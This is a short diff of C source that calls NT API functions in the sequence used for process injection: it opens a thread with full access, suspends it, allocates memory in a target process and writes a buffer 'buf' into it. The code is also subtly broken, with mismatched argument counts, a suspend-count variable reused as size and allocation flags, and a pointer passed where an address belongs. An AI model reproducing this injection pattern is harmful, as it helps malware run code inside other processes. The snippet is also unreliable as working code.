@@ -157,15 +157,13 @@ int main(int argc, char** argv, char* envp) {
 	HANDLE hProc;
 	OBJECT_ATTRIBUTES oa;
 	PVOID baseAddress = NULL;
+	ULONG n;
 
 
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG))ptr_NtOpenThread)(hThread, THREAD_ALL_ACCESS, &oa ,0);
-
-	ULONG n;
-
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PULONG))ptr_NtSuspendThread)(hThread, &n);
-	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hProc, &baseAddress);
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hProc, &baseAddress, n,n,n);
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(hProc, &baseAddress, &buf, sizeof(buf), &n);
 
 
